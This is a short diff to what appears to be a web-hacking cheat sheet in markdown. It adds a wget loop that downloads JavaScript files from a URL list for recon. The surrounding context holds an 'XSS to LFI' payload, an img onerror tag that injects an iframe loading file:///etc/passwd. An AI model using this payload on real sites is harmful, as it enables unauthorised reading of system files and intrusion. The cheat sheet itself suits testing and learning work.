@@ -12,6 +12,19 @@ Find Sensitif / Gold / Hoki / Endpoint in JS <br>
 
 <br>
 
+
+Download JS <br>
+```nano urls.txt``` <br>
+```https://example.com/js/index.php```<br>
+```https://example.com/js/index2.php```<br>
+
+```while read url; do wget -c "$url"; done < /home/linux/urls.txt```
+
+
+
+
+
+
 XSS to LFI <br>
 ```<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>```
 <br>
